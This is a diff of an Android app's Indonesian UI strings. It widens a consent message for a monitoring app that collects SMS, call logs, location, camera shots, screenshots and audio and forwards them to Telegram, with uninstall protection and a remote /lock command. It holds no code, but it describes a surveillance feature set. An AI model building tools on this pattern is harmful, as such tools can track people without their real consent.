@@ -125,7 +125,7 @@
     <string name="setup_admin_denied">Proteksi tidak aktif</string>
     <string name="setup_status_fmt">Bot: %1$s | Izin: %2$s | %3$s</string>
     <string name="setup_consent_title">Persetujuan eksplisit diperlukan</string>
-    <string name="setup_consent_text">Aplikasi ini memantau SMS, log panggilan, lokasi (termasuk latar), jepretan kamera, dan notifikasi, lalu meneruskannya ke Telegram Anda. Admin Perangkat dan pengecualian baterai hanya dipakai agar monitoring tetap jalan. Ketuk OK untuk setuju dan mulai monitoring.</string>
+    <string name="setup_consent_text">Aplikasi ini memantau SMS, log panggilan, lokasi (termasuk latar), jepretan kamera, tangkapan layar, rekaman audio, dan notifikasi, lalu meneruskannya ke Telegram Anda. Pengecualian baterai hanya dipakai agar monitoring tetap jalan. Admin Perangkat dipakai untuk menjaga monitoring, proteksi uninstall, dan kunci layar jarak jauh lewat perintah /lock. Ketuk OK untuk setuju dan mulai monitoring.</string>
     <string name="msg_permissions_granted">Semua izin diberikan</string>
     <string name="msg_service_failed">Error: layanan tak bisa jalan</string>
     <string name="msg_action_failed">Aksi gagal, coba lagi</string>
